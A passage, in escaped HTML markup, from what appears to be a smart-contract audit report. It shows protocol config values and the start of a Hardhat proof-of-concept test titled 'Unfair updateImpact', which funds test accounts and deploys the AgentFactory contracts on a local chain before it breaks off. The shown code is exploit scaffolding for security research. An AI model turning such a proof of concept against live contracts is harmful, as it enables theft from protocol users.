class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e anad add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Unfair updateImpact\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at ${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 